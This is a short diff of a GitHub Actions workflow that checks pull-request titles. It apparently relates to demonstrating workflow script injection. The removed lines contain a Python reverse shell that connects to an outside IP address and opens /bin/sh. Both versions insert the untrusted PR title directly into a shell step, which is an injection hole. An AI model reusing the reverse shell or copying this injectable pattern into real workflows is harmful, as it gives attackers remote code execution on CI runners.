@@ -1,3 +1,4 @@
+
 name: Check PR title
 on: [pull_request]
 jobs:
@@ -7,10 +8,5 @@ jobs:
       - uses: actions/checkout@v3
       - run: |
           title="${{ github.event.pull_request.title }}"
-          if [[ $title =~ ^octocat ]]; then
-          echo "PR title starts with 'octocat'"
-          exit 0
-          else
-          echo "'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"35.212.196.110\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"
-          exit 0
-          fi
+          echo $title 
+         
